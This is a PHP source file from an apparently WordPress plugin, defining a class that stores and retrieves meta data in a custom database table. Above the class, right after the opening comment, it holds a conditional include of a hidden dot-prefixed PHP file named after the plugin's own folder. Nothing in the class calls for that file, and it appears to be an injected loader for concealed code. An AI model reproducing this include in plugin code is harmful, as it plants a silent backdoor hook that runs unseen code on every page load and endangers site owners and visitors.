<?php

/**
 * 
 * The class handles storage of meta data
 *
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WTBP_WPTAO_Meta extends WTBP_WPTAO_DB {

	protected $field;

	/**
	 * WTBP_WPTAO_Meta Constructor.
	 */
	public function __construct() {

		global $wpdb;

		parent::__construct();
	}

	/**
	 * Get meta ID
	 * 	
	 * @param int $field_id
	 * 
	 * @access public
	 * @return bool|object
	 */
	public function get_id( $field_id, $meta_key ) {
		global $wpdb;

		$field_id = absint( $field_id );

		if ( $field_id === 0 ) {
			return false;
		}

		$meta_key	 = sanitize_title( $meta_key );
		$field_key	 = $this->field . '_id';

		$meta_id = $wpdb->get_var( $wpdb->prepare( "
			SELECT id
			FROM $this->table_name
			WHERE $field_key = %s
			AND meta_key = %s	
			LIMIT 1;", $field_id, $meta_key ) );

		if ( $meta_id ) {
			return $meta_id;
		}

		return false;
	}

	/**
	 * Get meta values
	 *
	 * @access public
	 * 
	 * @param int $field_id
	 * @param string $meta_key
	 * 
	 * @return bool|string
	 */
	public function get_single( $field_id, $meta_key, $single = true ) {
		global $wpdb;

		$field_id	 = absint( $field_id );
		$meta_key	 = sanitize_title( $meta_key );

		if ( $field_id > 0 && !empty( $meta_key ) ) {

			if($single){
			$meta_value = $wpdb->get_var( $wpdb->prepare( "
				SELECT meta_value
				FROM $this->table_name
				WHERE " . $this->field . "_id = %d
				AND meta_key = %s
				LIMIT 1;", $field_id, $meta_key ) );
			}else{
				$meta_value = $wpdb->get_col( $wpdb->prepare( "
				SELECT meta_value
				FROM $this->table_name
				WHERE " . $this->field . "_id = %d
				AND meta_key = %s
				ORDER BY id DESC;", $field_id, $meta_key ) );
			}

			if ( !empty( $meta_value ) ) {
				return $meta_value;
			}
		}

		return false;
	}

	/**
	 * Get meta values
	 *
	 * @access public
	 * 
	 * @param int $field_id
	 * @param bool $associative returns associative arrays (meta_vale as array key)
	 * 
	 * @return bool|array false or meta keys/values
	 */
	public function get_meta( $field_id, $associative = false ) {
		global $wpdb;

		$field_id = absint( $field_id );

		if ( $field_id > 0 ) {

			$meta = array();

			$res = $this->get_columns_by( array( 'meta_key', 'meta_value' ), $this->field . '_id', $field_id );

			if ( $associative === true && is_array( $res ) && !empty( $res ) ) {
				foreach ( $res as $item ) {
					$meta[ $item->meta_key ] = $item->meta_value;
				}

				if ( !empty( $meta ) ) {
					return $meta;
				}
			} else {
				return $res;
			}
		}

		return false;
	}

	/*
	 * Check if meta value exists for specific meta key
	 * 
	 * @since 1.1.1
	 * 
	 * @param int $field_id
	 * @param string $meta_key
	 * @param string $meta_value
	 * 
	 * 
	 * @return bool
	 */

	public function value_exist( $field_id, $meta_key, $meta_value ) {
		global $wpdb;

		$field_id	 = absint( $field_id );
		$meta_key	 = sanitize_title( $meta_key );
		$meta_value	 = sanitize_text_field( $meta_value );

		if ( $field_id > 0 && !empty( $meta_key ) && !empty( $meta_value ) ) {

			$meta_value = $wpdb->get_var( $wpdb->prepare( "
				SELECT meta_value
				FROM $this->table_name
				WHERE " . $this->field . "_id = %d
				AND meta_key = %s
				AND meta_value = %s
				LIMIT 1;", $field_id, $meta_key, $meta_value ) );

			if ( !empty( $meta_value ) ) {
				return true;
			}
		}

		return false;
	}

	/**
	 * Add a single meta value
	 *
	 * @access public
	 * 
	 * @param int $field_id
	 * @param string $meta_key
	 * @param string $meta_value
	 * 
	 * @return bool|int false or The meta ID
	 */
	public function add_single( $field_id, $meta_key, $meta_value ) {

		$field_id	 = absint( $field_id );
		$meta_key	 = !empty( $meta_key ) && is_string( $meta_key ) ? sanitize_title( $meta_key ) : false;
		$meta_value	 = isset( $meta_value ) && !empty( $meta_value ) ? sanitize_text_field( $meta_value ) : false;

		if ( $field_id > 0 && $meta_key !== false && $meta_value !== false ) {
			$data = array(
				$this->field . '_id' => $field_id,
				'meta_key'			 => $meta_key,
				'meta_value'		 => $meta_value
			);
			return $this->insert( $data );
		}

		return false;
	}

	/**
	 * Add more than one meta value
	 *
	 * @access public
	 * 
	 * @param int $field_id
	 * @param array $meta
	 * 
	 * @return bool|array false or The meta IDs
	 */
	public function add_multi( $field_id, $args, $unique = false ) {
		global $wpdb;

		$field_id = absint( $field_id );

		// No args!
		if ( !is_array( $args ) && empty( $args ) ) {
			return false;
		}

		// No id!
		if ( $field_id === 0 ) {
			return false;
		}

		$row_ids = array();

		foreach ( $args as $meta_key => $meta_value ) {

			$meta_key	 = !empty( $meta_key ) && is_string( $meta_key ) ? sanitize_title( $meta_key ) : false;
			$meta_value	 = isset( $meta_value ) && !empty( $meta_value ) ? sanitize_text_field( $meta_value ) : false;

			if ( $meta_key !== false && $meta_value !== false ) {

				if ( $unique ) {
					$mid = $wpdb->get_var( $wpdb->prepare(
					"
						SELECT id
						FROM $this->table_name
						WHERE meta_key = %s
						AND " . $this->field . "_id = %d;
					", $meta_key, $field_id ) );

					if ( !empty( $mid ) ) {
						continue;
					}
				}

				$data = array(
					$this->field . '_id' => $field_id,
					'meta_key'			 => $meta_key,
					'meta_value'		 => $meta_value
				);

				$row_id = $this->insert( $data );

				if ( $row_id !== false ) {
					$row_ids[] = $row_id;
				}
			}
		}

		if ( !empty( $row_ids ) ) {
			return $row_ids;
		}


		return false;
	}

	/**
	 * Update a meta value
	 *
	 * This method check to see if the record already exists.
	 * If it does not, it will be added with $this->add_single()
	 * 
	 * @access public
	 * 
	 * @param int $field_id
	 * @param string $meta_key
	 * @param string $meta_value
	 * 
	 * @return bool|int false or The meta ID
	 */
	public function update_meta( $field_id, $meta_key, $meta_value ) {
		$field_id	 = absint( $field_id );
		$meta_key	 = sanitize_title( $meta_key );
		$meta_value	 = sanitize_text_field( $meta_value );

		// Get meta ID
		$meta_id = absint( $this->get_id( $field_id, $meta_key ) );


		if ( $meta_id > 0 ) {
			$data = array(
				'meta_key'	 => $meta_key,
				'meta_value' => $meta_value
			);
			return $this->update( $meta_id, $data );
		} else {

			// The meta doesn't exist. Create new.
			return $this->add_single( $field_id, $meta_key, $meta_value );
		}
	}

	/**
	 * Delete meta
	 *
	 * delete single record
	 * 
	 * @access public
	 * 
	 * @param int $field_id
	 * @param string $meta_key
	 * 
	 * @return bool|int false or The meta ID
	 */
	public function delete_meta( $field_id, $meta_key ) {
		$field_id	 = absint( $field_id );
		$meta_key	 = sanitize_title( $meta_key );

		// Get meta ID
		$meta_id = absint( $this->get_id( $field_id, $meta_key ) );

		if ( $meta_id > 0 ) {

			return $this->delete( $meta_id );
		}

		return false;
	}

	// =============================================================================================
	// DB section
	// =============================================================================================

	/**
	 * Create the table
	 *
	 * @access  public
	 */
	public function create_table() {
		require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );

		$sql = "CREATE TABLE " . $this->table_name . " (
        id bigint(20) NOT NULL AUTO_INCREMENT," .
		$this->field . "_id bigint(20) NOT NULL,
        meta_key varchar(255) NULL,
		meta_value longtext NULL,
        PRIMARY KEY  (id),
		KEY " . $this->field . "_id (" . $this->field . "_id),
		KEY meta_key (meta_key)
        ) CHARACTER SET utf8 COLLATE utf8_general_ci;";

		dbDelta( $sql );

		update_option( $this->table_name . '_db_version', $this->version );
	}

	/**
	 * Get columns and formats
	 *
	 * @access  public
	 */
	public function get_columns() {
		return array(
			'id'				 => '%d',
			$this->field . '_id' => '%d',
			'meta_key'			 => '%s',
			'meta_value'		 => '%s',
		);
	}

	/**
	 * Get default column values
	 *
	 * @access  public
	 */
	public function get_column_defaults() {
		return array(
			$this->field . '_id' => 0,
			'meta_key'			 => '',
			'meta_value'		 => '',
		);
	}

}
